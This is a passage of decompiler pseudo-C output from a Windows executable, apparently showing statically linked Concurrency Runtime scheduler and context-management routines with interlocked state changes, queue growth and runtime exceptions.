  v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  sub_453A71(3, 4u, v3, v2);
  v4 = 1;
  v5 = *(_BYTE *)(*(_DWORD *)(v13 + 156) + 173);
  v6 = _InterlockedIncrement((volatile signed __int32 *)(v13 + 44));
  if ( v5 )
  {
    if ( v6 != 1 || _InterlockedCompareExchange((volatile signed __int32 *)(v13 + 44), 2, 1) != 1 )
      v4 = 2;
    sub_4592C3((struct _SINGLE_LIST_ENTRY *)(v13 - 4), v4);
  }
  else if ( v6 == 1 )
  {
    v15 = 0;
    v14 = 0;
    v7 = (struct _SINGLE_LIST_ENTRY *)sub_458A6A((_DWORD *)(v13 - 4), &v15, &v14);
    if ( _InterlockedCompareExchange((volatile signed __int32 *)(v13 + 44), 2, 1) == 1 )
    {
      if ( v15 )
        sub_458FAE((int)v7, *(_DWORD *)(v13 + 24), 0, 0);
      sub_4593FA(v13 - 4, (int)v7, 1);
    }
    else if ( v7 )
    {
      if ( v15 )
      {
        sub_451A84(*(_DWORD *)(v13 + 28), v7, 1);
      }
      else
      {
        if ( v14 )
        {
          Next = v7[42].Next;
          UserMathErrorFunction();
          sub_45BE64(Next, (int)&v7[1]);
          UserMathErrorFunction();
        }
        v9 = v7->Next[5].Next;
        v10 = sub_44CC5D(&v7[1].Next);
        sub_452901(v12, (_DWORD *)(v10 + 12));
        ((void (__thiscall *)(struct _SINGLE_LIST_ENTRY *, int, int, int, int))v9)(v7, v12[0], v12[1], v12[2], v12[3]);
      }
    }
  }
  return UserMathErrorFunction();
}

//----- (00458789) --------------------------------------------------------
char __thiscall sub_458789(int this)
{
  __int32 v2; // ecx
  LPVOID v3; // eax
  LPVOID v4; // esi
  __int32 v6[2]; // [esp+8h] [ebp-8h] BYREF

  if ( *(_DWORD *)(this + 160) )
  {
    *(_BYTE *)(this + 176) = 1;
    v2 = *(_DWORD *)(this + 160);
    v6[0] = 0;
    LOBYTE(v3) = sub_4570B6(v2, v6, 15, 1);
    if ( (_BYTE)v3 )
      LOBYTE(v3) = sub_4571AD((_DWORD **)v6[1], v6[0], 0, 0);
  }
  else
  {
    v4 = (LPVOID)(this + 4);
    v3 = sub_4501C0();
    if ( v3 == v4 )
    {
      *(_BYTE *)(this + 176) = 1;
    }
    else
    {
      sub_45915F((_DWORD *)this);
      sub_4587FB((_DWORD *)this);
      LOBYTE(v3) = sub_450091(*(_DWORD *)(this + 32));
    }
  }
  return (char)v3;
}

//----- (004587FB) --------------------------------------------------------
void __thiscall sub_4587FB(_DWORD *this)
{
  sub_4530C9((int)(this + 1));
  sub_459278(this, 0, 0);
}

//----- (00458813) --------------------------------------------------------
int __thiscall sub_458813(_DWORD *this)
{
  UserMathErrorFunction();
  sub_4587FB(this);
  return sub_450091(this[8]);
}

//----- (0045882E) --------------------------------------------------------
BOOL __thiscall sub_45882E(int this, int a2)
{
  _DWORD *v3; // eax
  int v4; // eax
  char v5; // al
  char pExceptionObject[12]; // [esp+10h] [ebp-30h] BYREF
  int v8[2]; // [esp+1Ch] [ebp-24h] BYREF
  int v9; // [esp+24h] [ebp-1Ch]
  void *v10; // [esp+28h] [ebp-18h] BYREF
  int v11; // [esp+2Ch] [ebp-14h]
  char v12; // [esp+32h] [ebp-Eh]
  char v13; // [esp+33h] [ebp-Dh]
  int v14; // [esp+3Ch] [ebp-4h]

  v11 = 0;
  v12 = 0;
  *(_DWORD *)(this + 72) = GetCurrentThreadId();
  sub_4538A6((LPVOID)(this + 4));
  v3 = (_DWORD *)(*(int (__thiscall **)(_DWORD, void **))(**(_DWORD **)(this + 32) + 12))(*(_DWORD *)(this + 32), &v10);
  v14 = 0;
  v11 = 1;
  if ( sub_4547B8(v3, 9u) || (v4 = sub_44CE8E(), v13 = 1, v4 != 6) )
    v13 = 0;
  v14 = -1;
  sub_454793(&v10);
  if ( v13 )
  {
    v12 = 1;
    sub_45651B(1);
  }
  UserMathErrorFunction();
  *(_DWORD *)(this + 172) = 0;
  v13 = 0;
  if ( !sub_4589FC(this) )
    goto LABEL_8;
LABEL_7:
  v5 = sub_458DC5(this);
  v13 = v5;
  while ( !v5 )
  {
LABEL_8:
    *(_BYTE *)(this + 179) &= ~2u;
    v8[0] = 0;
    v9 = 0;
    if ( !*(_DWORD *)(this + 160) )
    {
      UserMathErrorFunction();
      std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVnested_scheduler_missing_detach_Concurrency__);
    }
    if ( !*(_BYTE *)(this + 178) && sub_45789C(*(_DWORD *)(this + 160)) )
    {
      UserMathErrorFunction();
      sub_44FE6D(*(_DWORD **)(this + 32));
      UserMathErrorFunction();
    }
    if ( sub_459709(this, (int)v8) )
    {
      if ( v8[0] != 1 )
      {
        sub_4589BF((int *)this, v8);
        goto LABEL_7;
      }
      sub_4593FA(this, v9, 0);
      break;
    }
    if ( sub_458DC5(this) )
      break;
    sub_459609((_DWORD *)this);
    if ( *(_BYTE *)(this + 176) )
    {
      sub_458813((_DWORD *)this);
      break;
    }
    v5 = v13;
  }
  if ( v12 )
    sub_45653D();
  return sub_453143();
}
// 44CE8E: using guessed type int sub_44CE8E(void);

//----- (004589BF) --------------------------------------------------------
char __thiscall sub_4589BF(int *this, _DWORD *a2)
{
  sub_45DF56(a2, this);
  ++*(_DWORD *)(this[40] + 108);
  UserMathErrorFunction();
  sub_45CF78(a2);
  UserMathErrorFunction();
  return sub_453698(this + 1);
}

//----- (004589FC) --------------------------------------------------------
char __thiscall sub_4589FC(int this)
{
  int v2; // esi
  int v3; // ecx

  if ( !*(_DWORD *)(this + 168) )
    return 0;
  UserMathErrorFunction();
  v2 = *(_DWORD *)(this + 168);
  if ( *(_BYTE *)(this + 177) )
  {
    (*(void (__thiscall **)(_DWORD, _DWORD))(v2 + 12))(*(_DWORD *)(v2 + 12), *(_DWORD *)(this + 168));
    *(_DWORD *)(this + 168) = 0;
  }
  else
  {
    sub_45DFA3(*(_DWORD *)(this + 168));
    v3 = *(_DWORD *)(this + 32);
    *(_DWORD *)(this + 168) = 0;
    sub_451ACE(v3, v2);
  }
  UserMathErrorFunction();
  sub_453698((int *)(this + 4));
  return 1;
}

//----- (00458A6A) --------------------------------------------------------
int __thiscall sub_458A6A(_DWORD *this, bool *a2, bool *a3)
{
  int v4; // esi
  struct _SINGLE_LIST_ENTRY *v5; // ebx
  int v7; // [esp-Ch] [ebp-28h]
  int v8[2]; // [esp+Ch] [ebp-10h] BYREF
  int v9; // [esp+14h] [ebp-8h]
  _DWORD *v10; // [esp+18h] [ebp-4h]

  v10 = this;
  v4 = this[40];
  v7 = this[7];
  v8[0] = 0;
  v9 = 0;
  if ( !(*(unsigned __int8 (__thiscall **)(int, int *, int, _DWORD, int))(v4 + 72))(v4 + 40, v8, v7, 0, 25) )
  {
    v5 = (struct _SINGLE_LIST_ENTRY *)sub_450810(this[8], 1);
    *a2 = v5 != 0;
    return (int)v5;
  }
  if ( v8[0] == 1 )
    return v9;
  UserMathErrorFunction();
  v5 = (struct _SINGLE_LIST_ENTRY *)sub_450810(this[8], 1);
  UserMathErrorFunction();
  if ( !v5 )
  {
    if ( !(*(unsigned __int8 (__thiscall **)(int, int *, _DWORD, _DWORD, int))(v10[40] + 72))(
            v10[40] + 40,
            v8,
            v10[7],
            0,
            1) )
      return (int)v5;
    return sub_45CAF5(v8);
  }
  if ( !sub_45D165(v8) )
  {
    if ( !(*(unsigned __int8 (__thiscall **)(int, int *, _DWORD, _DWORD, int))(v10[40] + 72))(
            v10[40] + 40,
            v8,
            v10[7],
            0,
            7) )
    {
      *a2 = 1;
      return (int)v5;
    }
    if ( v8[0] == 1 )
    {
      sub_451A84(v10[8], v5, 1);
      return sub_45CAF5(v8);
    }
  }
  *a3 = v8[0] == 4;
  sub_45CB42(v8, (int)v5);
  return (int)v5;
}

//----- (00458B94) --------------------------------------------------------
int __thiscall sub_458B94(_DWORD **this, int a2)
{
  int *v3; // eax

  UserMathErrorFunction();
  v3 = (int *)sub_457269(this[39]);
  sub_458230(v3, a2);
  return UserMathErrorFunction();
}

//----- (00458BC0) --------------------------------------------------------
signed __int32 __thiscall sub_458BC0(volatile signed __int32 *this, signed __int32 a2)
{
  int v2; // esi

  v2 = 0;
  if ( a2 && a2 == *((_DWORD *)this + 41) && _InterlockedCompareExchange(this + 41, 0, a2) == a2 )
    return a2;
  return v2;
}

//----- (00458BEE) --------------------------------------------------------
int __thiscall sub_458BEE(_DWORD *this)
{
  return sub_41C280(this - 1);
}

//----- (00458BF6) --------------------------------------------------------
int __thiscall sub_458BF6(_DWORD *this)
{
  return this[39];
}

//----- (00458BFD) --------------------------------------------------------
int __thiscall sub_458BFD(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[8] + 52))(this[8]);
}

//----- (00458C16) --------------------------------------------------------
int __thiscall sub_458C16(_DWORD *this)
{
  int v2; // edi

  UserMathErrorFunction();
  if ( this[39] )
    v2 = *(_DWORD *)(this[39] + 136);
  else
    v2 = -1;
  UserMathErrorFunction();
  return v2;
}

//----- (00458C45) --------------------------------------------------------
void __thiscall sub_458C45(int *this, int a2, int a3, int a4)
{
  int *v4; // edi
  _DWORD *v5; // eax
  volatile __int32 *v6; // esi
  int v7; // edx
  int v8; // eax
  int v9; // ebx
  int v10; // ecx
  int v11; // edx
  unsigned int v12; // edx
  int v13; // ecx
  int v14; // edx
  int v15; // ecx
  void *v16; // [esp+10h] [ebp-30h]
  void *Block; // [esp+14h] [ebp-2Ch]
  unsigned int v19; // [esp+20h] [ebp-20h]
  _DWORD *v20; // [esp+24h] [ebp-1Ch]
  int v21; // [esp+28h] [ebp-18h]
  int v22; // [esp+2Ch] [ebp-14h]
  int v23; // [esp+30h] [ebp-10h]

  v4 = this;
  v19 = 2 * this[2] + 2;
  v21 = unknown_libname_86((unsigned __int64)v19 >> 30 != 0 ? -1 : 4 * v19);
  Block = (void *)v4[3];
  v5 = (_DWORD *)unknown_libname_86((unsigned __int64)v19 >> 29 != 0 ? -1 : 8 * v19);
  v20 = v5;
  if ( v5 )
    `vector constructor iterator'(v5, 8u, v19, unknown_libname_90);
  else
    v20 = 0;
  v6 = (volatile __int32 *)v4[5];
  v16 = (void *)v4[4];
  sub_44AE12(v6);
  v7 = 0;
  v8 = *v4;
  v9 = v4[1] - *v4;
  v22 = *v4;
  v23 = 0;
  if ( v9 > 0 )
  {
    do
    {
      *(_DWORD *)(v21 + 4 * v7) = *(_DWORD *)(v4[3] + 4 * (v4[2] & v8));
      v10 = v4[4];
      v11 = v4[2] & v22;
      v20[2 * v23] = *(_DWORD *)(v10 + 8 * v11);
      v4 = this;
      v20[2 * v23 + 1] = *(_DWORD *)(v10 + 8 * v11 + 4);
      v7 = v23 + 1;
      v8 = v22 + 1;
      v23 = v7;
      ++v22;
    }
    while ( v7 < v9 );
  }
  memset((void *)(v21 + 4 * v9), 0, 4 * (v19 - v9));
  v4[3] = v21;
  v12 = v19 - 1;
  v4[4] = (int)v20;
  *v4 = 0;
  v4[2] = v19 - 1;
  if ( a3 )
  {
    v13 = v4[4];
    v14 = v9 & v12;
    *(_DWORD *)(v13 + 8 * v14) = a3;
    *(_DWORD *)(v13 + 8 * v14 + 4) = a4;
    v12 = v4[2];
    v15 = a2 | 1;
  }
  else
  {
    v15 = a2;
  }
  *(_DWORD *)(v4[3] + 4 * (v9 & v12)) = v15;
  v4[1] = v9 + 1;
  sub_44AE53(v6);
  j_j__free(Block);
  j_j__free(v16);
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00458DBD) --------------------------------------------------------
bool __thiscall sub_458DBD(_DWORD *this)
{
  return this[11] == 2;
}

//----- (00458DC5) --------------------------------------------------------
char __thiscall sub_458DC5(int this)
{
  if ( *(_BYTE *)(this + 178) || !*(_BYTE *)(*(_DWORD *)(this + 160) + 173) )
    return 0;
  if ( *(_DWORD *)(this + 172) )
    sub_45741A((_DWORD *)(*(_DWORD *)(this + 32) + 60), *(_DWORD *)(*(_DWORD *)(this + 160) + 144));
  *(_DWORD *)(this + 172) = 0;
  if ( sub_4592C3((struct _SINGLE_LIST_ENTRY *)this, 0) )
    sub_458813((_DWORD *)this);
  return 1;
}

//----- (00458E23) --------------------------------------------------------
int __thiscall sub_458E23(int this)
{
  int v2; // eax
  int v3; // esi
  int v4; // ecx
  int v6; // [esp+Ch] [ebp-18h]
  int v7; // [esp+10h] [ebp-14h]
  int v8; // [esp+14h] [ebp-10h]
  int v9; // [esp+18h] [ebp-Ch]
  int v10; // [esp+1Ch] [ebp-8h]
  bool v11; // [esp+22h] [ebp-2h] BYREF
  bool v12; // [esp+23h] [ebp-1h] BYREF

  UserMathErrorFunction();
  v12 = 0;
  v11 = 0;
  v2 = sub_458A6A((_DWORD *)this, &v12, &v11);
  v3 = v2;
  v7 = v2;
  if ( v12 )
    sub_458FAE(v2, *(_DWORD *)(this + 28), 0, 0);
  UserMathErrorFunction();
  v4 = *(_DWORD *)(this + 160);
  v6 = *(_DWORD *)(this + 32);
  *(_DWORD *)(this + 160) = 0;
  v10 = v4;
  v8 = *(_DWORD *)(this + 156);
  v9 = v3;
  if ( !v3 )
    v9 = (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4);
  (*(void (__fastcall **)(int, __int32, int))(*(_DWORD *)v10 + 16))(
    v10,
    _InterlockedExchange((volatile __int32 *)(this + 44), 1),
    v7);
  if ( v9 )
  {
    (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v8 + 4))(v8, v9, 2);
  }
  else
  {
    sub_45749E(v10, 4, 1);
    sub_4500AA(v6);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v8 + 8))(v8, 2);
  }
  UserMathErrorFunction();
  return UserMathErrorFunction();
}

//----- (00458F28) --------------------------------------------------------
char __thiscall sub_458F28(int this, char a2)
{
  int v3; // eax
  _BYTE *v4; // eax
  char pExceptionObject[12]; // [esp+4h] [ebp-Ch] BYREF

  v3 = *(_DWORD *)(this + 20);
  if ( a2 )
  {
    v4 = (_BYTE *)(v3 + 1);
    *(_DWORD *)(this + 20) = v4;
    if ( v4 == (_BYTE *)1 )
    {
      UserMathErrorFunction();
      (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(this + 156) + 32))(*(_DWORD *)(this + 156));
      LOBYTE(v4) = UserMathErrorFunction();
    }
  }
  else
  {
    if ( !v3 )
    {
      std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_oversubscribe_operation_Concurrency__);
    }
    v4 = (_BYTE *)(v3 - 1);
    *(_DWORD *)(this + 20) = v4;
    if ( !v4 )
    {
      v4 = (_BYTE *)sub_458BC0((volatile signed __int32 *)(this - 4), *(_DWORD *)(this + 160));
      if ( v4 )
        LOBYTE(v4) = sub_45750E(v4);
    }
  }
  return (char)v4;
}

//----- (00458FAE) --------------------------------------------------------
int __thiscall sub_458FAE(int this, int a2, int a3, char a4)
{
  int result; // eax
  char v5; // dl

  result = a2;
  v5 = 0;
  *(_BYTE *)(this + 236) = 0;
  *(_DWORD *)(this + 28) = a2;
  if ( a3 )
  {
    if ( a4 )
    {
      result = *(_DWORD *)(a2 + 256);
      if ( (*(_BYTE *)(result + 48) & 4) == 0 )
        _InterlockedIncrement((volatile signed __int32 *)(result + 20));
      v5 = 1;
    }
    *(_BYTE *)(this + 177) = v5;
    *(_DWORD *)(this + 168) = a3;
  }
  else
  {
    result = *(_DWORD *)(a2 + 256);
    if ( (*(_BYTE *)(result + 48) & 4) == 0 )
      _InterlockedIncrement((volatile signed __int32 *)(result + 20));
  }
  return result;
}

//----- (00459001) --------------------------------------------------------
int __thiscall sub_459001(int this, int a2)
{
  int result; // eax

  *(_DWORD *)(this + 160) = a2;
  result = this + 44;
  _InterlockedExchange((volatile __int32 *)(this + 44), 0);
  return result;
}

//----- (00459018) --------------------------------------------------------
void __thiscall sub_459018(int *this, int a2)
{
  int v2; // edi
  int v3; // esi

  v2 = this[1];
  v3 = this[2];
  if ( v2 >= v3 + *this )
  {
    sub_458C45(this, a2, 0, 0);
  }
  else
  {
    *(_DWORD *)(this[3] + 4 * (v2 & v3)) = a2;
    this[1] = v2 + 1;
  }
}

//----- (00459059) --------------------------------------------------------
void __thiscall sub_459059(_DWORD *this)
{
  __int32 v2; // ecx
  __int32 v3; // [esp+4h] [ebp-8h] BYREF

  if ( *((_BYTE *)this + 178) )
  {
    v2 = this[40];
    v3 = 0;
    if ( !sub_4570B6(v2, &v3, 15, 1) && !(unsigned __int8)sub_457169((_DWORD **)this[40], (int)this) )
    {
      do
        (*(void (__thiscall **)(_DWORD *))(*this + 32))(this);
      while ( !(unsigned __int8)sub_457169((_DWORD **)this[40], (int)this) );
    }
    *((_BYTE *)this + 178) = 0;
  }
}

//----- (004590C2) --------------------------------------------------------
int __thiscall sub_4590C2(struct _SINGLE_LIST_ENTRY *this)
{
  UserMathErrorFunction();
  sub_4592C3(this, 3);
  return UserMathErrorFunction();
}

//----- (004590E1) --------------------------------------------------------
void __thiscall sub_4590E1(int this)
{
  sub_453698((int *)(this + 4));
  sub_459278((_DWORD *)this, 0, 0);
  *(_DWORD *)(this + 72) = 0;
  *(_BYTE *)(this + 236) = 1;
}

//----- (00459104) --------------------------------------------------------
int __thiscall sub_459104(int (__thiscall **this)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD), int a2, int a3, int a4)
{
  return this[18](this + 10, a2, a3, a4, 7);
}

//----- (0045912C) --------------------------------------------------------
int __thiscall sub_45912C(_DWORD *this, int a2)
{
  int result; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  result = a2;
  if ( !a2 )
  {
    sub_42E473(pExceptionObject, (int)"pThreadProxy");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  this[39] = a2;
  return result;
}

//----- (0045915F) --------------------------------------------------------
char __thiscall sub_45915F(_DWORD *this)
{
  char result; // al
  char v3[8]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+Ch] [ebp-8h]
  void (*v5)(); // [esp+10h] [ebp-4h]

  if ( !this[11] )
  {
    v4 = 0;
    v5 = sub_44AE5E;
    do
      result = sub_449592((int)v3);
    while ( !this[11] );
  }
  return result;
}
// 45915F: using guessed type char var_10[8];

//----- (0045918A) --------------------------------------------------------
char __cdecl sub_45918A(_DWORD *a1, int a2)
{
  char result; // al
  char v3[8]; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+10h] [ebp-8h]
  void (*v5)(); // [esp+14h] [ebp-4h]

  if ( *a1 != a2 )
  {
    v4 = 0;
    v5 = sub_44AE5E;
    do
      result = sub_449592((int)v3);
    while ( *a1 != a2 );
  }
  return result;
}
// 45918A: using guessed type char var_10[8];

//----- (004591B7) --------------------------------------------------------
int __thiscall sub_4591B7(int this)
{
  int v2; // ebx
  int v3; // eax
  int v4; // ebx
  int v5; // esi
  int result; // eax
  int v7; // [esp-Ch] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-24h]
  int v9; // [esp+Ch] [ebp-14h] BYREF
  int v10; // [esp+14h] [ebp-Ch]
  int v11; // [esp+18h] [ebp-8h]
  int v12; // [esp+1Ch] [ebp-4h]

  v12 = 0;
  v11 = this;
  UserMathErrorFunction();
  v2 = *(_DWORD *)(this + 8);
  v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  v8 = v2;
  v4 = v11;
  sub_453A71(5, 4u, v3, v8);
  if ( *(_BYTE *)(*(_DWORD *)(v11 + 156) + 173) )
  {
    sub_4592C3((struct _SINGLE_LIST_ENTRY *)(v11 - 4), 2);
  }
  else
  {
    v5 = *(_DWORD *)(v11 + 156);
    v7 = *(_DWORD *)(v11 + 24);
    v9 = 0;
    v10 = 0;
    if ( (*(unsigned __int8 (__thiscall **)(int, int *, int, _DWORD, int))(v5 + 72))(v5 + 40, &v9, v7, 0, 1) )
      sub_4593FA(v4 - 4, v10, 2);
    else
      LOBYTE(v12) = 1;
  }
  result = UserMathErrorFunction();
  if ( (_BYTE)v12 )
    return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v4 + 152) + 12))(*(_DWORD *)(v4 + 152));
  return result;
}

//----- (00459278) --------------------------------------------------------
void __thiscall sub_459278(_DWORD *this, int a2, char a3)
{
  int v4; // eax

  if ( this[7] )
  {
    sub_45918A(this + 57, 0);
    sub_4512CA(*(void **)(this[7] + 256));
    if ( a3 )
    {
      v4 = *(_DWORD *)(a2 + 256);
      if ( (*(_BYTE *)(v4 + 48) & 4) == 0 )
        _InterlockedIncrement((volatile signed __int32 *)(v4 + 20));
    }
    this[7] = a2;
  }
}

//----- (004592C3) --------------------------------------------------------
char __thiscall sub_4592C3(struct _SINGLE_LIST_ENTRY *this, int a2)
{
  struct _SINGLE_LIST_ENTRY *v2; // ebx
  int v3; // eax
  volatile __int32 *v4; // esi
  int v5; // ebx
  int v6; // eax
  struct _SINGLE_LIST_ENTRY *v7; // esi
  int v9[7]; // [esp-10h] [ebp-2Ch] BYREF
  struct _SINGLE_LIST_ENTRY *Next; // [esp+Ch] [ebp-10h]
  struct _SINGLE_LIST_ENTRY *v11; // [esp+10h] [ebp-Ch] BYREF
  struct _SINGLE_LIST_ENTRY *v12; // [esp+14h] [ebp-8h]
  struct _SINGLE_LIST_ENTRY *v13; // [esp+18h] [ebp-4h]

  v2 = this;
  Next = this[39].Next;
  v3 = 0;
  v12 = this;
  v13 = 0;
  if ( !this[40].Next )
    goto LABEL_15;
  sub_459059(this);
  v11 = v2[40].Next[48].Next;
  v13 = v2 + 1;
  UserMathErrorFunction();
  ((void (__thiscall *)(struct _SINGLE_LIST_ENTRY *))v2[40].Next->Next[3].Next)(v2[40].Next);
  v4 = (volatile __int32 *)&v2[11];
  v2[40].Next = 0;
  if ( a2 )
  {
    UserMathErrorFunction();
    _InterlockedExchange(v4, 1);
  }
  else
  {
    v5 = (int)v2[3].Next;
    v6 = ((int (__thiscall *)(struct _SINGLE_LIST_ENTRY *))v12[8].Next->Next[1].Next)(v12[8].Next);
    sub_453A71(6, 4u, v6, v5);
    v2 = v12;
    sub_45AA4F(&v12[7].Next->Next, v12);
    v4 = (volatile __int32 *)&v12[11];
  }
  sub_4526C4((int)v2[8].Next, &v11);
  sub_4527A1((volatile signed __int32 *)v2[8].Next, 0);
  LOBYTE(v3) = v2[44].Next;
  v13 = (struct _SINGLE_LIST_ENTRY *)v3;
  if ( a2 )
  {
LABEL_15:
    if ( a2 == 2 || (v13 = (struct _SINGLE_LIST_ENTRY *)v3, a2 == 3) )
    {
      v7 = v2[7].Next;
      sub_452901(v9, &v7[3].Next);
      sub_45A27B(v7, (int)v2, v9[0], v9[1], v9[2], v9[3]);
    }
    if ( a2 )
      ((void (__thiscall *)(struct _SINGLE_LIST_ENTRY *, int))Next->Next[2].Next)(Next, 1);
  }
  else
  {
    _InterlockedExchange(v4, 1);
  }
  return (char)v13;
}
// 4593A4: variable 'v3' is possibly undefined

//----- (004593FA) --------------------------------------------------------
int __thiscall sub_4593FA(int this, int a2, int a3)
{
  int v3; // edi
  _DWORD *v4; // esi
  int v5; // ebx
  int v6; // eax
  int v7; // eax
  int v8; // ebx
  __int32 v9; // edx
  int v10; // ecx
  int v11; // edi
  int result; // eax
  int v13[3]; // [esp-10h] [ebp-30h] BYREF
  int v14; // [esp-4h] [ebp-24h]
  int v15; // [esp+Ch] [ebp-14h]
  int v16; // [esp+10h] [ebp-10h]
  int v17; // [esp+14h] [ebp-Ch]
  int v18; // [esp+18h] [ebp-8h]
  int v19; // [esp+1Ch] [ebp-4h]

  v19 = 1;
  v3 = this;
  v17 = this;
  if ( a3 )
  {
    if ( a3 != 1 )
    {
      if ( a3 == 2 )
      {
        v4 = *(_DWORD **)(this + 28);
        sub_452901(v13, v4 + 3);
        sub_45A27B(v4, v3, v13[0], v13[1], v13[2], v14);
      }
      else if ( a3 == 3 )
      {
        v19 = 2;
      }
    }
  }
  else
  {
    v5 = *(_DWORD *)(this + 12);
    v6 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 32) + 4))(*(_DWORD *)(this + 32));
    v3 = v17;
    sub_453A71(6, 4u, v6, v5);
    sub_45AA4F(*(_DWORD **)(v3 + 28), (struct _SINGLE_LIST_ENTRY *)v3);
    v19 = 0;
  }
  v15 = v3 + 4;
  UserMathErrorFunction();
  v7 = *(_DWORD *)(v3 + 160);
  v16 = *(_DWORD *)(v3 + 32);
  *(_DWORD *)(v3 + 160) = 0;
  v8 = *(_DWORD *)(v3 + 156);
  v18 = v7;
  v17 = a2;
  if ( !a2 )
  {
    v17 = (*(int (__thiscall **)(int))(*(_DWORD *)v7 + 4))(v18);
    v7 = v18;
  }
  v9 = _InterlockedExchange((volatile __int32 *)(v3 + 44), 1);
  v10 = *(_DWORD *)v7;
  v14 = a2;
  v11 = v18;
  (*(void (__fastcall **)(int, __int32, int))(v10 + 16))(v18, v9, a2);
  if ( v17 )
  {
    result = (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v8 + 4))(v8, v17, v19);
  }
  else
  {
    sub_45749E(v11, 4, 1);
    sub_4500AA(v16);
    result = (*(int (__thiscall **)(int, int))(*(_DWORD *)v8 + 8))(v8, v19);
  }
  if ( a3 )
    return UserMathErrorFunction();
  return result;
}

//----- (00459546) --------------------------------------------------------
int __fastcall sub_459546(int a1)
{
  signed __int32 v2; // eax
  int v3; // edi
  _ThrowInfo *v4; // ebx
  int v5; // eax
  int v6; // ebx
  int (__thiscall *v7)(int, int, int, int, _ThrowInfo *); // esi
  int result; // eax
  int v9[3]; // [esp-10h] [ebp-30h] BYREF
  _ThrowInfo *v10; // [esp-4h] [ebp-24h]
  char pExceptionObject[12]; // [esp+Ch] [ebp-14h] BYREF
  int v12; // [esp+18h] [ebp-8h]
  int v13; // [esp+1Ch] [ebp-4h]

  v13 = a1;
  if ( (LPVOID)(a1 != 4 ? a1 : 0) == sub_4501C0() )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    v10 = (_ThrowInfo *)&_TI2_AVcontext_self_unblock_Concurrency__;
    goto LABEL_8;
  }
  v2 = _InterlockedDecrement((volatile signed __int32 *)(a1 + 44));
  v3 = *(_DWORD *)(a1 + 28);
  v4 = *(_ThrowInfo **)(a1 + 8);
  v12 = v2;
  v5 = (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v10 = v4;
  v6 = v13;
  sub_453A71(4, 4u, v5, (int)v10);
  if ( v12 == 1 )
  {
    *(_DWORD *)(v13 + 44) = 0;
    sub_45915F((_DWORD *)(v6 - 4));
    v7 = *(int (__thiscall **)(int, int, int, int, _ThrowInfo *))(*(_DWORD *)(v6 - 4) + 20);
    sub_452901(v9, (_DWORD *)(*(_DWORD *)(v6 + 24) + 12));
    return v7(v6 - 4, v9[0], v9[1], v9[2], v10);
  }
  result = v12 + 1;
  if ( v12 != -1 && v12 != 0 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    v10 = (_ThrowInfo *)&_TI2_AVcontext_unblock_unbalanced_Concurrency__;
LABEL_8:
    _CxxThrowException(pExceptionObject, v10);
  }
  return result;
}
// 4F5B48: using guessed type __TI_flags _TI2_AVcontext_self_unblock_Concurrency__;

//----- (00459609) --------------------------------------------------------
int __thiscall sub_459609(_DWORD *this)
{
  unsigned int v2; // eax
  _DWORD *v3; // edi
  unsigned int v4; // esi
  int v5; // ecx
  int result; // eax
  bool v7; // zf

  v2 = ++this[43];
  if ( v2 == 1 )
  {
    v3 = (_DWORD *)this[8];
    v4 = *(_DWORD *)(this[40] + 144);
    sub_45745A(v3 + 15, v4);
    sub_457144(v3, v4);
    v2 = this[43];
  }
  if ( v2 < 0x100 )
    return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)this[39] + 12))(this[39]);
  if ( v2 == 256 )
  {
    v5 = this[40];
    *((_BYTE *)this + 178) = 1;
    sub_45749E(v5, 2, 1);
    return sub_45718B((_DWORD **)this[40], (int)this);
  }
  if ( (*((_BYTE *)this + 179) & 2) != 0 )
  {
    this[43] = v2 - 1;
    return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)this[39] + 12))(this[39]);
  }
  sub_452855(this[8], 1);
  while ( !(unsigned __int8)sub_457169((_DWORD **)this[40], (int)this) )
    (*(void (__thiscall **)(_DWORD *))(*this + 32))(this);
  result = sub_452855(this[8], 0);
  v7 = this[43] == 0;
  *((_BYTE *)this + 178) = 0;
  if ( !v7 )
    result = sub_45741A((_DWORD *)(this[8] + 60), *(_DWORD *)(this[40] + 144));
  this[43] = 0;
  return result;
}

//----- (00459709) --------------------------------------------------------
char __thiscall sub_459709(int this, int a2)
{
  if ( !(unsigned __int8)sub_459104(
                           *(int (__thiscall ***)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(this + 160),
                           a2,
                           *(_DWORD *)(this + 28),
                           *(unsigned __int8 *)(this + 178)) )
    return 0;
  sub_459059((_DWORD *)this);
  if ( *(_DWORD *)(this + 172) )
    sub_45741A((_DWORD *)(*(_DWORD *)(this + 32) + 60), *(_DWORD *)(*(_DWORD *)(this + 160) + 144));
  *(_DWORD *)(this + 172) = 0;
  return 1;
}

//----- (00459765) --------------------------------------------------------
int __thiscall sub_459765(struct _SINGLE_LIST_ENTRY *this)
{
  struct _SINGLE_LIST_ENTRY *Next; // ebx
  int v3; // eax
  struct _SINGLE_LIST_ENTRY *v4; // ebx
